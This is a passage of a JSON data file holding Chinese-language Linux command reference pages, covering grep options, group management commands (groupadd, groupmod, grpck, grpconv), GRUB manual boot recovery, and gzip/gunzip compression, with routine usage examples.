class=\"hljs-built_in\">line</span>. | egrep -<span class=\"hljs-keyword\">o</span> <span class=\"hljs-string\">\"[a-z]+\\.\"</span>\n<span class=\"hljs-built_in\">line</span>.\n</code></pre>\n<p>统计文件或者文本中包含匹配字符串的行数  <strong>-c</strong>  选项：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">grep</span> -c <span class=\"hljs-string\">\"text\"</span> file_name\n</code></pre>\n<p>输出包含匹配字符串的行数  <strong>-n</strong>  选项：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">grep</span> <span class=\"hljs-string\">\"text\"</span> -n file_name\n<span class=\"hljs-comment\"># 或</span>\ncat file_name | <span class=\"hljs-keyword\">grep</span> <span class=\"hljs-string\">\"text\"</span> -n\n\n<span class=\"hljs-comment\">#多个文件</span>\n<span class=\"hljs-keyword\">grep</span> <span class=\"hljs-string\">\"text\"</span> -n file_1 file_2\n</code></pre>\n<p>打印样式匹配所位于的字符或字节偏移：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">echo</span> gun <span class=\"hljs-keyword\">is</span> not unix | <span class=\"hljs-keyword\">grep</span> -<span class=\"hljs-keyword\">b</span> -<span class=\"hljs-keyword\">o</span> <span class=\"hljs-string\">\"not\"</span>\n<span class=\"hljs-number\">7</span>:not\n#一行中字符串的字符便宜是从该行的第一个字符开始计算，起始值为<span class=\"hljs-number\">0</span>。选项  **-<span class=\"hljs-keyword\">b</span> -<span class=\"hljs-keyword\">o</span>**  一般总是配合使用。\n</code></pre>\n<p>搜索多个文件并查找匹配文本在哪些文件中：</p>\n<pre><code class=\"language-shell\">grep -l <span class=\"hljs-string\">\"text\"</span> file1 file2 file3...\n</code></pre>\n<h3 id=\"grep递归搜索文件\">grep递归搜索文件</h3>\n<p>在多级目录中对文本进行递归搜索：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">grep</span> <span class=\"hljs-string\">\"text\"</span> . -r -n\n<span class=\"hljs-comment\"># .表示当前目录。</span>\n</code></pre>\n<p>忽略匹配样式中的字符大小写：</p>\n<pre><code class=\"language-shell\">echo <span class=\"hljs-string\">\"hello world\"</span> <span class=\"hljs-string\">| grep -i \"</span>HELLO<span class=\"hljs-string\">\"</span>\n<span class=\"hljs-meta\"># hello</span>\n</code></pre>\n<p>选项  <strong>-e</strong>  制动多个匹配样式：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">echo</span> this <span class=\"hljs-keyword\">is</span> <span class=\"hljs-keyword\">a</span> text <span class=\"hljs-built_in\">line</span> | <span class=\"hljs-keyword\">grep</span> -<span class=\"hljs-keyword\">e</span> <span class=\"hljs-string\">\"is\"</span> -<span class=\"hljs-keyword\">e</span> <span class=\"hljs-string\">\"line\"</span> -<span class=\"hljs-keyword\">o</span>\n<span class=\"hljs-keyword\">is</span>\n<span class=\"hljs-built_in\">line</span>\n\n#也可以使用 **-<span class=\"hljs-keyword\">f</span>** 选项来匹配多个样式，在样式文件中逐行写出需要匹配的字符。\n<span class=\"hljs-keyword\">cat</span> patfile\naaa\nbbb\n\n<span class=\"hljs-keyword\">echo</span> aaa bbb ccc ddd eee | <span class=\"hljs-keyword\">grep</span> -<span class=\"hljs-keyword\">f</span> patfile -<span class=\"hljs-keyword\">o</span>\n</code></pre>\n<p>在grep搜索结果中包括或者排除指定文件：</p>\n<pre><code class=\"language-shell\"># 只在目录中所有的.php和.html文件中递归搜索字符<span class=\"hljs-string\">\"main()\"</span>\n<span class=\"hljs-keyword\">grep</span> <span class=\"hljs-string\">\"main()\"</span> . -r --<span class=\"hljs-keyword\">include</span> *.{php,html}\n\n# 在搜索结果中排除所有README文件\n<span class=\"hljs-keyword\">grep</span> <span class=\"hljs-string\">\"main()\"</span> . -r --<span class=\"hljs-keyword\">exclude</span> <span class=\"hljs-string\">\"README\"</span>\n\n# 在搜索结果中排除filelist文件列表里的文件\n<span class=\"hljs-keyword\">grep</span> <span class=\"hljs-string\">\"main()\"</span> . -r --<span class=\"hljs-keyword\">exclude</span>-<span class=\"hljs-keyword\">from</span> filelist\n</code></pre>\n<p>使用0值字节后缀的grep与xargs：</p>\n<pre><code class=\"language-shell\"># 测试文件：\n<span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"aaa\"</span> &gt; file1\n<span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"bbb\"</span> &gt; file2\n<span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"aaa\"</span> &gt; file3\n\n<span class=\"hljs-keyword\">grep</span> <span class=\"hljs-string\">\"aaa\"</span> <span class=\"hljs-keyword\">file</span>* -lZ | xargs -<span class=\"hljs-number\">0</span> rm\n\n# 执行后会删除file1和file3，<span class=\"hljs-keyword\">grep</span>输出用-Z选项来指定以<span class=\"hljs-number\">0</span>值字节作为终结符文件名（\\<span class=\"hljs-number\">0</span>），xargs -<span class=\"hljs-number\">0</span> 读取输入并用<span class=\"hljs-number\">0</span>值字节终结符分隔文件名，然后删除匹配文件，-Z通常和-<span class=\"hljs-keyword\">l</span>结合使用。\n</code></pre>\n<p>grep静默输出：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">grep</span> -<span class=\"hljs-keyword\">q</span> <span class=\"hljs-string\">\"test\"</span> filename\n<span class=\"hljs-comment\"># 不会输出任何信息，如果命令运行成功返回0，失败则返回非0值。一般用于条件测试。</span>\n</code></pre>\n<p>打印出匹配文本之前或者之后的行：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\"># 显示匹配某个结果之后的3行，使用 -A 选项：</span>\nseq <span class=\"hljs-number\">10</span> <span class=\"hljs-string\">| grep \"</span><span class=\"hljs-number\">5</span><span class=\"hljs-string\">\" -A 3</span>\n<span class=\"hljs-number\">5</span>\n<span class=\"hljs-number\">6</span>\n<span class=\"hljs-number\">7</span>\n<span class=\"hljs-number\">8</span>\n\n<span class=\"hljs-meta\"># 显示匹配某个结果之前的3行，使用 -B 选项：</span>\nseq <span class=\"hljs-number\">10</span> <span class=\"hljs-string\">| grep \"</span><span class=\"hljs-number\">5</span><span class=\"hljs-string\">\" -B 3</span>\n<span class=\"hljs-number\">2</span>\n<span class=\"hljs-number\">3</span>\n<span class=\"hljs-number\">4</span>\n<span class=\"hljs-number\">5</span>\n\n<span class=\"hljs-meta\"># 显示匹配某个结果的前三行和后三行，使用 -C 选项：</span>\nseq <span class=\"hljs-number\">10</span> <span class=\"hljs-string\">| grep \"</span><span class=\"hljs-number\">5</span><span class=\"hljs-string\">\" -C 3</span>\n<span class=\"hljs-number\">2</span>\n<span class=\"hljs-number\">3</span>\n<span class=\"hljs-number\">4</span>\n<span class=\"hljs-number\">5</span>\n<span class=\"hljs-number\">6</span>\n<span class=\"hljs-number\">7</span>\n<span class=\"hljs-number\">8</span>\n\n<span class=\"hljs-meta\"># 如果匹配结果有多个，会用“--”作为各匹配结果之间的分隔符：</span>\necho -e <span class=\"hljs-string\">\"a\\nb\\nc\\na\\nb\\nc\"</span> <span class=\"hljs-string\">| grep a -A 1</span>\na\nb\n--\na\nb\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "groupadd",
        "des": "用于创建一个新的工作组",
        "body": "<h1 id=\"groupadd\">groupadd</h1>\n<p>用于创建一个新的工作组</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>groupadd命令</strong> 用于创建一个新的工作组，新工作组的信息将被添加到系统文件中。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">groupadd</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-g：指定新建工作组的id；</span>\n<span class=\"hljs-deletion\">-r：创建系统工作组，系统工作组的组ID小于500；</span>\n<span class=\"hljs-deletion\">-K：覆盖配置文件“/ect/login.defs”；</span>\n<span class=\"hljs-deletion\">-o：允许添加组ID号不唯一的工作组。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>组名：指定新建工作组的组名。</p>\n<h3 id=\"实例\">实例</h3>\n<p>建立一个新组，并设置组ID加入系统：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">groupadd</span> -g <span class=\"hljs-number\">344</span> jsdigname\n</code></pre>\n<p>此时在<code>/etc/passwd</code>文件中产生一个组ID（GID）是344的项目。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "groupdel",
        "des": "用于删除指定的工作组",
        "body": "<h1 id=\"groupdel\">groupdel</h1>\n<p>用于删除指定的工作组</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>groupdel命令</strong> 用于删除指定的工作组，本命令要修改的系统文件包括/ect/group和/ect/gshadow。若该群组中仍包括某些用户，则必须先删除这些用户后，方能删除群组。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">groupdel</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>组：要删除的工作组名。</p>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\">groupadd damon  <span class=\"hljs-regexp\">//</span>创建damon工作组\ngroupdel damon  <span class=\"hljs-regexp\">//</span>删除这个工作组\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "groupmod",
        "des": "更改群组识别码或名称",
        "body": "<h1 id=\"groupmod\">groupmod</h1>\n<p>更改群组识别码或名称</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>groupmod命令</strong> 更改群组识别码或名称。需要更改群组的识别码或名称时，可用groupmod指令来完成这项工作。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">groupmod</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-g&lt;群组识别码&gt;：设置欲使用的群组识别码；</span>\n<span class=\"hljs-deletion\">-o：重复使用群组识别码；</span>\n<span class=\"hljs-deletion\">-n&lt;新群组名称&gt;：设置欲使用的群组名称。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>组名：指定要修改的工作的组名。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "groups",
        "des": "打印指定用户所在组的名称。",
        "body": "<h1 id=\"groups\">groups</h1>\n<p>打印指定用户所在组的名称。</p>\n<h2 id=\"概要\">概要</h2>\n<pre><code class=\"language-shell\">groups [<span class=\"hljs-symbol\">OPTION</span>]... [username]...\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li>打印指定用户所在组的名称。</li>\n</ul>\n<h2 id=\"选项\">选项</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\">--help       显示帮助信息并退出。</span>\n<span class=\"hljs-comment\">--version    显示版本信息并退出。</span>\n</code></pre>\n<h2 id=\"参数\">参数</h2>\n<p>username（可选）：可以是一到多个，不提供时默认为当前用户。</p>\n<h2 id=\"返回值\">返回值</h2>\n<p>返回0表示成功，返回非0值表示失败。</p>\n<h2 id=\"例子\">例子</h2>\n<p>显示linux用户所属的组</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># groups linux</span>\nlinux : linux adm dialout cdrom plugdev lpadmin admin sambashare\n</code></pre>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li>该命令等价于 <code>id -Gn</code>。</li>\n<li>每个用户属于<code>/etc/passwd</code>中指定的一个组和在<code>/etc/group</code>中指定的其他组。</li>\n<li>该命令是<code>GNU coreutils</code>包中的命令，相关的帮助信息请查看<code>man -s 1 groups</code>，<code>info coreutils 'groups invocation'</code>。</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "grpck",
        "des": "用于验证组文件的完整性",
        "body": "<h1 id=\"grpck\">grpck</h1>\n<p>用于验证组文件的完整性</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>grpck命令</strong> 用于验证组文件的完整性，在验证之前，需要先锁定（lock）组文件<code>/etc/group</code>和<code>/etc/shadow</code>。</p>\n<p>grpck命令检查数据是否正确存放，每条记录是否都包含足够的信息，是否有一个唯一的组名，是否包含正确的用户，是否正确设置了组的管理员等。grpck检查发现错误以后，在命令行提示用户是否删除错误的记录。如果用户没有明确回答删除记录，grpck终止运行。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">grpck</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-r：只读模式；</span>\n<span class=\"hljs-deletion\">-s：排序组id。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>对组账号和影子文件进行验证：</p>\n<pre><code class=\"language-shell\">grpck   <span class=\"hljs-comment\"># 必须以管理员身份运行</span>\ngrpck <span class=\"hljs-regexp\">/etc/g</span>roup <span class=\"hljs-regexp\">/etc/g</span>shadow   <span class=\"hljs-comment\"># 后面两句一样，如果没有输出信息，则表示没有错误。</span>\n</code></pre>\n<p>测试错误的实例：</p>\n<pre><code class=\"language-shell\">**echo check_user:x: &gt;&gt; /etc/<span class=\"hljs-keyword\">group</span>    <span class=\"hljs-title\"># 添加一行错误的格式数据\ncat</span> /etc/<span class=\"hljs-keyword\">group</span> <span class=\"hljs-title\">| grep</span> check_user**\ncheck_user:x:  <span class=\"hljs-comment\"># 这儿GID字段为空，是错误的。</span>\n\n **grpck /etc/group** \ninvalid <span class=\"hljs-keyword\">group</span> <span class=\"hljs-title\">file</span> entry\ndelete line 'check_user:x:'? y      <span class=\"hljs-comment\"># 提示是否删除</span>\ngrpck: the files have been updated  <span class=\"hljs-comment\"># 这时已经删除了错误的行，提示文件已经更新。</span>\n\n **cat /etc/<span class=\"hljs-keyword\">group</span>  <span class=\"hljs-title\">| grep</span> check_user   <span class=\"hljs-comment\"># 没有查到，已经删除了。** </span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "grpconv",
        "des": "用来开启群组的投影密码",
        "body": "<h1 id=\"grpconv\">grpconv</h1>\n<p>用来开启群组的投影密码</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>grpconv命令</strong> 用来开启群组的投影密码。Linux系统里的用户和群组密码，分别存放在<code>/etc</code>目录下的passwd和group文件中。因系统运作所需，任何人都得以读取它们，造成安全上的破绽。投影密码将文件内的密码改存在<code>/etc</code>目录下的shadow和gshadow文件内，只允许系统管理者读取，同时把原密码置换为\"x\"字符。投影密码的功能可随时开启或关闭，您只需执行grpconv指令就能开启群组投影密码。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">grpconv</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>设置cdy组密码</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">groupmod</span> --password <span class=\"hljs-number\">123456</span> cdy\n<span class=\"hljs-attribute\">cat</span> /etc/group | grep cdy\n<span class=\"hljs-attribute\">cdy</span>:<span class=\"hljs-number\">123456</span>:<span class=\"hljs-number\">1000</span>:     # 看出密码是<span class=\"hljs-number\">123456</span>\n</code></pre>\n<p>启动影子系统</p>\n<pre><code class=\"language-shell\">grpconv\ncat <span class=\"hljs-regexp\">/etc/g</span>roup |  grep cdy\ncdy:x:<span class=\"hljs-number\">1000</span>:      <span class=\"hljs-comment\"># 看出密码段已经被x替代</span>\n\ncat <span class=\"hljs-regexp\">/etc/g</span>shadow | grep cdy\ncdy:<span class=\"hljs-number\">123456</span>::      <span class=\"hljs-comment\"># 已经移到影子文件了</span>\n</code></pre>\n<p>注：gshadow, shadow只有root权限才可以查看。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "grpunconv",
        "des": "用来关闭群组的投影密码",
        "body": "<h1 id=\"grpunconv\">grpunconv</h1>\n<p>用来关闭群组的投影密码</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>grpunconv命令</strong> 用来关闭群组的投影密码。它会把密码从gshadow文件内，回存到group文件里。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">grpunconv</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>未关闭的情况</p>\n<pre><code class=\"language-shell\">cat <span class=\"hljs-regexp\">/etc/g</span>shadow | <span class=\"hljs-keyword\">grep</span> cdy\ncdy:<span class=\"hljs-number\">123456</span>::\n</code></pre>\n<p>关闭影子密码</p>\n<pre><code class=\"language-shell\">cat <span class=\"hljs-regexp\">/etc/g</span>shadow\ncat: <span class=\"hljs-regexp\">/etc/g</span>shadow: 没有那个文件或目录\n</code></pre>\n<p>查看密码已经复制到<code>/etc/group</code>中了。</p>\n<pre><code class=\"language-shell\">cat /etc/<span class=\"hljs-keyword\">group</span> <span class=\"hljs-title\">| grep</span> cdy\ncdy:<span class=\"hljs-number\">123456</span>:<span class=\"hljs-number\">1000</span>:\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "grub",
        "des": "多重引导程序grub的命令行shell工具",
        "body": "<h1 id=\"grub\">grub</h1>\n<p>多重引导程序grub的命令行shell工具</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>grub命令</strong> 是多重引导程序grub的命令行shell工具。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">grub</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\">--batch：打开批处理模式；</span>\n<span class=\"hljs-comment\">--boot-drive=&lt;驱动器&gt;：指定stage2的引导驱动器；</span>\n<span class=\"hljs-comment\">--config-file&lt;配置文件&gt;：指定stage2的配置文件；</span>\n<span class=\"hljs-comment\">--device-map=&lt;文件&gt;：指定设备的映射文件；</span>\n<span class=\"hljs-comment\">--help：显示帮助信息；</span>\n<span class=\"hljs-comment\">--install-partition=&lt;分区&gt;：指定stage2安装分区；</span>\n<span class=\"hljs-comment\">--no-config-file：不使用配置文件；</span>\n<span class=\"hljs-comment\">--no-pager：不使用内部分页器；</span>\n<span class=\"hljs-comment\">--preset-menu：使用预设菜单；</span>\n<span class=\"hljs-comment\">--probe-second-floppy：检测第二个软盘驱动器；</span>\n<span class=\"hljs-comment\">--read-only：只读模式。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>利用grub命令来启动损坏的Linux系统，可能你的电脑因为某些原因损坏不能自动启动了。当然原因很多，可能的现象也很多。</p>\n<p>这里说一下这种情况下的处理方法，即：屏幕上提示<code>grub&gt;</code>，但你的硬盘上数据没有丢失，各分区都是好的。这种情况是你的grub信息损坏了，但比较严重的是系统启动不了。</p>\n<p>当然，在正常启动情况下，屏幕上出现grub的启动项选择菜单时按<code>c</code>键也是可以进入<code>grub&gt;</code>状态的。这时候我们需要用grub的命令来手工启动系统。</p>\n<p>只需要用到四个命令boot、kernel、initrd、boot。</p>\n<p>但grub本身命令很多，比如查看文件内容的cat ，你输入help会得到。</p>\n<p>首先，输入“ root (hd ” ，然后按两次 TAB 键； /* 这会列出你电脑上可能的磁盘设备，硬盘为 hd0/hd1 或 sd0/sd1 等 */</p>\n<p>然后，选择你的安装 Linux 系统的硬盘，比如 hd0 ，输入 “ root (hd0, ” 再按两次 TAB 键； /* 这会列出你的第一块硬盘上的分区情况，你会知道哪个是 swap 交换分区， 0x82 ，哪个是 Linux 分区 0x83 */</p>\n<p>选择你认为可能的 /boot 目录所在的分区， 输入<code>root (hd0, 1)</code>回车；</p>\n<p>接着，输入<code>cat /boot/vm</code>， 按两次 TAB 键，如果出现一些 vm 开头的文件，比如 vmlinuz-2.6.15-26-386 说明这里是 /boot 所在的分区。</p>\n<p>删除上一次的输入，再输入<code>cat /boot/initrd</code>，按两次 TAB 键，如果出现一些 initrd 开头的文件，比如 initrd.img-2.6.15-26-386 说明这个 /boot 所在的分区有 initrd ，即 ramdisk 镜像；</p>\n<p>删除上一次的输入，再输入<code>cat /sbin/init</code>，按两次 TAB 键，如果出现一些 init 开头的文件，比如<code>/sbin/init</code>说明这个分区是<code>/</code>所在的分区；</p>\n<p>如果没有出现<code>/sbin/init</code>文件，说明<code>(hd0,1)</code>分区仅仅是<code>/boot</code>分区而不是<code>/</code>分区。重新输入<code>root (hd0,N)</code>命令，这里 N 是某个 Linux 分区，然后再试<code>cat /sbin/init</code>， 直到屏幕上出现<code>/sbin/init</code>，说明你找到了<code>/</code>分区，严格来说，应该是<code>/sbin</code>目录所在的分区；</p>\n<p>依次输入命令：</p>\n<pre><code class=\"language-shell\">root (hd0,<span class=\"hljs-number\">1</span>)   <span class=\"hljs-regexp\">/* 假设 /</span>dev<span class=\"hljs-regexp\">/hda2 是你的 /</span>boot 所在的分区 */\nkernel <span class=\"hljs-regexp\">/boot/</span>vmlinuz-<span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">15</span>-<span class=\"hljs-number\">26</span>-<span class=\"hljs-number\">386</span> ro dev=<span class=\"hljs-regexp\">/dev/</span>hda3    <span class=\"hljs-regexp\">/* 假设 /</span>dev<span class=\"hljs-regexp\">/hda3 是你的 /</span> 所在的分区 */\ninitrd <span class=\"hljs-regexp\">/boot/i</span>nitrd.img-<span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">15</span>-<span class=\"hljs-number\">26</span>-<span class=\"hljs-number\">386</span>\nboot\n</code></pre>\n<p>即可启动系统。</p>\n<p>这里的关键问题是如何确定系统的几个分区：<code>/boot</code> <code>/</code> <code>/sbin</code></p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "gunzip",
        "des": "用来解压缩文件",
        "body": "<h1 id=\"gunzip\">gunzip</h1>\n<p>用来解压缩文件</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>gunzip命令</strong> 用来解压缩文件。gunzip是个使用广泛的解压缩程序，它用于解开被gzip压缩过的文件，这些压缩文件预设最后的扩展名为.gz。事实上gunzip就是gzip的硬连接，因此不论是压缩或解压缩，都可通过gzip指令单独完成。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">gunzip</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a或——ascii：使用ASCII文字模式；</span>\n<span class=\"hljs-deletion\">-c或--stdout或--to-stdout：把解压后的文件输出到标准输出设备；</span>\n<span class=\"hljs-deletion\">-f或-force：强行解开压缩文件，不理会文件名称或硬连接是否存在以及该文件是否为符号连接；</span>\n<span class=\"hljs-deletion\">-h或——help：在线帮助；</span>\n<span class=\"hljs-deletion\">-l或——list：列出压缩文件的相关信息；</span>\n<span class=\"hljs-deletion\">-L或——license：显示版本与版权信息；</span>\n<span class=\"hljs-deletion\">-n或--no-name：解压缩时，若压缩文件内含有原来的文件名称及时间戳记，则将其忽略不予处理；</span>\n<span class=\"hljs-deletion\">-N或——name：解压缩时，若压缩文件内含有原来的文件名称及时间戳记，则将其回存到解开的文件上；</span>\n<span class=\"hljs-deletion\">-q或——quiet：不显示警告信息；</span>\n<span class=\"hljs-deletion\">-r或——recursive：递归处理，将指定目录下的所有文件及子目录一并处理；</span>\n<span class=\"hljs-deletion\">-S或&lt;压缩字尾字符串&gt;或----suffix&lt;压缩字尾字符串&gt;：更改压缩字尾字符串；</span>\n<span class=\"hljs-deletion\">-t或——test：测试压缩文件是否正确无误；</span>\n<span class=\"hljs-deletion\">-v或——verbose：显示指令执行过程；</span>\n<span class=\"hljs-deletion\">-V或——version：显示版本信息；</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件列表：指定要解压缩的压缩包。</p>\n<h3 id=\"实例\">实例</h3>\n<p>首先将<code>/etc</code>目录下的所有文件以及子目录进行压缩，备份压缩包etc.zip到<code>/opt</code>目录，然后对etc.zip文件进行gzip压缩，设置gzip的压缩级别为9。</p>\n<pre><code class=\"language-shell\">zip –r <span class=\"hljs-regexp\">/opt/</span>etc.zip /etc\ngzip -<span class=\"hljs-number\">9</span>v <span class=\"hljs-regexp\">/opt/</span>etc.zip\n</code></pre>\n<p>查看上述etc.zip.gz文件的压缩信息。</p>\n<pre><code class=\"language-shell\">gzip -l <span class=\"hljs-regexp\">/opt/</span>etc.zip.gz\ncompressed        uncompressed ratio uncompressed_name\n<span class=\"hljs-number\">11938745</span>            <span class=\"hljs-number\">12767265</span>   <span class=\"hljs-number\">6.5</span>% <span class=\"hljs-regexp\">/opt/</span>etc.zip\n</code></pre>\n<p>解压上述etc.zip.gz文件到当前目录。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-selector-attr\">[root@mylinux ~]</span><span class=\"hljs-selector-id\">#gzip</span> –d /opt/etc<span class=\"hljs-selector-class\">.zip</span><span class=\"hljs-selector-class\">.gz</span> \n或者执行\n<span class=\"hljs-selector-attr\">[root@mylinux ~]</span><span class=\"hljs-selector-id\">#gunzip</span> /opt/etc<span class=\"hljs-selector-class\">.zip</span>.gz\n</code></pre>\n<p>通过上面的示例可以知道<code>gzip –d</code>等价于<code>gunzip</code>命令。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "gzexe",
        "des": "用来压缩可执行文件",
        "body": "<h1 id=\"gzexe\">gzexe</h1>\n<p>用来压缩可执行文件</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>gzexe命令</strong> 用来压缩可执行文件，压缩后的文件仍然为可执行文件，在执行时进行自动解压缩。当您去执行被压缩过的执行文件时，该文件会自动解压然后继续执行，和使用一般的执行文件相同。这个命令也可以看成是gunzip命令的一个扩展。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">gzexe</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-d：解压缩被gzexe压缩过的可执行文件。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：指定需要压缩的可执行文件。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "gzip",
        "des": "用来压缩文件",
        "body": "<h1 id=\"gzip\">gzip</h1>\n<p>用来压缩文件</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>gzip命令</strong> 用来压缩文件。gzip是个使用广泛的压缩程序，文件经它压缩过后，其名称后面会多处“.gz”扩展名。</p>\n<p>gzip是在Linux系统中经常使用的一个对文件进行压缩和解压缩的命令，既方便又好用。gzip不仅可以用来压缩大的、较少使用的文件以节省磁盘空间，还可以和tar命令一起构成Linux操作系统中比较流行的压缩文件格式。据统计，gzip命令对文本文件有60%～70%的压缩率。减少文件大小有两个明显的好处，一是可以减少存储空间，二是通过网络传输文件时，可以减少传输的时间。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">gzip</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a或——ascii：使用ASCII文字模式；</span>\n<span class=\"hljs-deletion\">-d或--decompress或----uncompress：解开压缩文件；</span>\n<span class=\"hljs-deletion\">-f或——force：强行压缩文件。不理会文件名称或硬连接是否存在以及该文件是否为符号连接；</span>\n<span class=\"hljs-deletion\">-h或——help：在线帮助；</span>\n<span class=\"hljs-deletion\">-l或——list：列出压缩文件的相关信息；</span>\n<span class=\"hljs-deletion\">-L或——license：显示版本与版权信息；</span>\n<span class=\"hljs-deletion\">-n或--no-name：压缩文件时，不保存原来的文件名称及时间戳记；</span>\n<span class=\"hljs-deletion\">-N或——name：压缩文件时，保存原来的文件名称及时间戳记；</span>\n<span class=\"hljs-deletion\">-q或——quiet：不显示警告信息；</span>\n<span class=\"hljs-deletion\">-r或——recursive：递归处理，将指定目录下的所有文件及子目录一并处理；</span>\n<span class=\"hljs-deletion\">-S或&lt;压缩字尾字符串&gt;或----suffix&lt;压缩字尾字符串&gt;：更改压缩字尾字符串；</span>\n<span class=\"hljs-deletion\">-t或——test：测试压缩文件是否正确无误；</span>\n<span class=\"hljs-deletion\">-v或——verbose：显示指令执行过程；</span>\n<span class=\"hljs-deletion\">-V或——version：显示版本信息；</span>\n<span class=\"hljs-deletion\">-&lt;压缩效率&gt;：压缩效率是一个介于1~9的数值，预设值为“6”，指定愈大的数值，压缩效率就会愈高；</span>\n<span 